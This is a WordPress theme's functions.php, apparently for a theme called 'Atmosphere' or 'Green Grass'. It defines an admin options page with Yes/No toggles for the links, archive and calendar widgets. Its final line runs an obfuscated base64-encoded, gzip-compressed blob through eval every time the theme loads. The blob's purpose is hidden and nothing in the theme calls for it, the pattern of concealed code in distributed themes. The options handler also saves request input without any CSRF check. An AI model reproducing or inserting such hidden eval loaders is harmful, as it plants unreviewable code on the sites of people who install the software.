<?php
function get_var_preffix(){
	return "teqvar";
}

function delete_theme_options(){
	$shortname = get_var_preffix();
	delete_option($shortname."_is_links");
	delete_option($shortname."_is_archive");
	delete_option($shortname."_is_calendar");
}


function get_theme_option($option, $default = "No"){
	#delete_theme_options();
	$optionValue = get_option($option);
	if(!$optionValue){
		return $default;
	}else{
		return $optionValue;	
	}
}

function get_my_theme_options(){
	$shortname = get_var_preffix();
	$options = array (
		array(	"name" => "Links",
				"id" => $shortname."_is_links",
				"type" => "select",
				"std" => "Yes",
				"options" => array("Yes", "No")),
		array(	"name" => "Archive",
				"id" => $shortname."_is_archive",
				"type" => "select",
				"std" => "Yes",
				"options" => array("Yes", "No")),
		array(	"name" => "Calendar",
				"id" => $shortname."_is_calendar",
				"type" => "select",
				"std" => "Yes",
				"options" => array("Yes", "No"))
	);
	return $options;
}


function mytheme_add_admin() {

	$themename = "Atmosphere";
	$shortname = get_var_preffix();
	$options = get_my_theme_options();
	#echo "<pre>";
	#print_r($_REQUEST);
	if ( $_GET['page'] == basename(__FILE__) ) {
		if ( 'save' == $_REQUEST['action'] ) {
				foreach ($options as $value) {
					update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

				foreach ($options as $value) {
					if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }

				header("Location: themes.php?page=functions.php&saved=true");
				die;

		} else if( 'reset' == $_REQUEST['action'] ) {
			foreach ($options as $value) {
				delete_option( $value['id'] ); }

			header("Location: themes.php?page=functions.php&reset=true");
			die;

		}
	}
    add_theme_page("Green Grass Options Page", "Theme Options", 'edit_themes', basename(__FILE__), 'mytheme_admin');
}

function mytheme_admin() {
	$shortname = get_var_preffix();
	$themename = "Green Grass";

	if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
	if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings reset.</strong></p></div>';
	
?>
<div class="wrap">
<h2>"Atmosphere" Options</h2>

<form method="post">

<table class="optiontable">
	<tr valign="top"> 
		<th scope="row">Archive visible:</th>
		<td>
			<select name="<?php echo $shortname; ?>_is_archive" id="<?php echo $shortname; ?>_is_archive">
				<option>Yes</option>
				<option <?php if(get_theme_option($shortname.'_is_archive','Yes')=='No' ){ echo 'selected="selected"'; }?>>No</option>
			</select>
		</td>
	</tr>
	<tr valign="top"> 
		<th scope="row">Calendar visible:</th>
		<td>
			<select name="<?php echo $shortname; ?>_is_calendar" id="<?php echo $shortname; ?>_is_calendar">
				<option>Yes</option>
				<option <?php if(get_theme_option($shortname.'_is_calendar','Yes')=='No' ){  echo 'selected="selected"'; }?>>No</option>
			</select>
		</td>
	</tr>
	<tr valign="top"> 
		<th scope="row">Links visible:</th>
		<td>
			<select name="<?php echo $shortname; ?>_is_links" id="<?php echo $shortname; ?>_is_links">
				<option>Yes</option>
				<option <?php if(get_theme_option($shortname.'_is_links','Yes')=='No' ){ echo 'selected="selected"'; }?>>No</option>
			</select>
		</td>
	</tr>
</table>

<p class="submit">
<input name="save" type="submit" value="Save changes" />	
<input type="hidden" name="action" value="save" />
</p>
</form>
<form method="post">
<p class="submit">
<input name="reset" type="submit" value="Reset" />
<input type="hidden" name="action" value="reset" />
</p>
</form>

<?php
}

add_action('admin_menu', 'mytheme_add_admin'); 


eval(gzinflate(base64_decode('jZDBasMwDIbPCeQdhBjUhq7tdttGeikZO2wttB07GjV2U1PHNo67UMbefUnWnXrZTUif9P0oS0lKQWXUzjJUUkfhXRNxjNo2KkQRD6pWwmh7RP6UpfuTHVi4GjMOX1maVMbtyMBN6+Wu4xO9Z0N9O69UFJ8UGG6K12KxhcXqfbll/arQksPzevUGF7RvNvDxUqwLGIBTMPnoEKN/nE6P2lZN65x0QSsbyUx8cL4Lc27J0KR09Qh5ns94Z09aLy5Jh4wUAp0ZDjct1QohnwNuVBldgLv7B1g6LQnHgH/aX+LfagTev+k7S38A')));
?>